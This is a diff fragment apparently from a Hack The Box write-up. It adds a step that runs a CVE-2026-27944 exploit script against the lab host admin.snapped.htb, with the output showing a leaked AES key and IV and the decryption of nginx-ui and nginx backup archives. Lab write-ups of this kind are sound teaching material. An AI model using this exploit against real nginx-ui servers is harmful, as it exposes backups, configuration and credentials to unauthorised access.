@@ -184,5 +184,29 @@ pip3 install pycryptodome
 So now the environment is setup i can run the script
 
 ```python
+python3 CVE-2026-27944.py --target http://admin.snapped.htb/ --decrypt
 
+X-Backup-Security: xpiIkj8Nu1jWGXdDp/BiDzq7BxQ0VXgAA5pFeMIhZBo=:/DSu2sdyJcDMgL58ejoTGw==
+Parsed AES-256 key: xpiIkj8Nu1jWGXdDp/BiDzq7BxQ0VXgAA5pFeMIhZBo=
+Parsed AES IV    : /DSu2sdyJcDMgL58ejoTGw==
+
+[*] Key length: 32 bytes (AES-256 ✓)
+[*] IV length : 16 bytes (AES block size ✓)
+
+[*] Extracting encrypted backup to backup_extracted
+[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
+[*] Decrypting hash_info.txt...
+    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
+[*] Decrypting nginx-ui.zip...
+    → Saved to backup_extracted/nginx-ui_decrypted.zip (7688 bytes)
+    → Extracted 2 files to backup_extracted/nginx-ui
+[*] Decrypting nginx.zip...
+    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
+    → Extracted 22 files to backup_extracted/nginx
+
+[*] Hash info:
+nginx-ui_hash: 9a01b67a51bec2b9b0e55ead3b5689543355c5eb6b897273a53a96874ad2c73a
+nginx_hash: fe6c270e128a7180fec2a1c6100853ced6f7ef021dedc42ec3053756161fcbd8
+timestamp: 20260610-104150
+version: 2.3.2
 ```
